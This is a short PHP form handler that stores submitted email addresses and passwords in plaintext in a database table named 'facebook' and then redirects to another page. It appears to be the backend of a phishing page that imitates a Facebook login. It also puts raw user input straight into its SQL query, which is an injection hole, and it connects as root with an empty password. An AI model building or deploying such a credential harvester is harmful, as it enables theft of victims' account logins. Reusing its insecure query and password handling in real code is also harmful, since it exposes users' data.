 <!DOCTYPE html>
<html>
<head>
	<title></title>
</head>
<body>

<?php
 error_reporting(0);
  	# code...
  	$email=$_POST['email'];
$password=$_POST['password'];

if(!empty($email)){
	if (!empty($password)) {
		$host="localhost";
		$dbusername="root";
		$dbpassword="";
		$dbname="test";
		  $conn= mysqli_connect($host,$dbusername,$dbpassword,$dbname);
		  if (mysqli_connect_error())
		  {
		  	echo "failed to connect";
		  }
		  else
		  {
   
$sql ="INSERT INTO facebook(email,password) values('$email','$password')";
     if ($conn->query($sql)) {
     	# code...
      header('Location:new.html');
         }
        else{
     	echo"Error:".$sql ."<br>" .$conn->Error;
             }
       $conn->close();
		  }
	}
	else{
	echo"password needed";
	die();
      }

}



  

 
?>
</body>
</html>
